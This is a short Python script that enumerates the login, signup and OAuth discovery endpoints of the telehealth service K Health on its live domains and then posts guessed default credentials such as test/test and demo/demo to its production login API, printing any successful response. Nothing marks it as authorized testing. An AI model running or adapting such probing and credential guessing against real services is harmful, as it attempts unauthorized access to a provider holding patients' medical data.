#!/usr/bin/env python3
import requests
import json
from bs4 import BeautifulSoup

print("[*] Finding K Health authentication flow\n")

# Common auth endpoints
auth_endpoints = [
    "https://khealth.com/auth/login",
    "https://khealth.com/auth/signup",
    "https://khealth.com/api/auth/login",
    "https://khealth.com/api/auth/register",
    "https://khealth.com/login",
    "https://khealth.com/signup",
    "https://khealth.com/.well-known/openid-configuration",
    "https://auth.khealth.com/.well-known/openid-configuration",
]

print("[1] Testing auth endpoints...\n")
for endpoint in auth_endpoints:
    try:
        r = requests.get(endpoint, timeout=5, allow_redirects=False)
        if r.status_code < 400:
            print(f"✅ {endpoint}")
            print(f"   Status: {r.status_code}")
            if 'json' in r.headers.get('content-type', ''):
                print(f"   Response: {r.json()}")
            else:
                print(f"   Response: {r.text[:300]}")
            print()
    except:
        pass

# Try OAuth discovery
print("\n[2] Checking for OAuth endpoints...\n")
oauth_endpoints = [
    "https://khealth.com/.well-known/oauth-authorization-server",
    "https://auth.khealth.com/.well-known/oauth-authorization-server",
]

for endpoint in oauth_endpoints:
    try:
        r = requests.get(endpoint, timeout=5)
        print(f"{endpoint}: {r.status_code}")
    except:
        pass

# Look for dev/test credentials in common places
print("\n[3] Testing for weak/default credentials...\n")
test_creds = [
    {"email": "test@khealth.com", "password": "test"},
    {"email": "demo@khealth.com", "password": "demo"},
    {"username": "test", "password": "test"},
]

for cred in test_creds:
    try:
        r = requests.post(
            "https://api.khealth.com/auth/login",
            json=cred,
            timeout=5
        )
        print(f"Trying {cred['email'] if 'email' in cred else cred['username']}: {r.status_code}")
        if r.status_code == 200:
            print(f"   ✅ SUCCESS: {r.text}")
    except:
        pass

print("\n[✓] Scan complete")
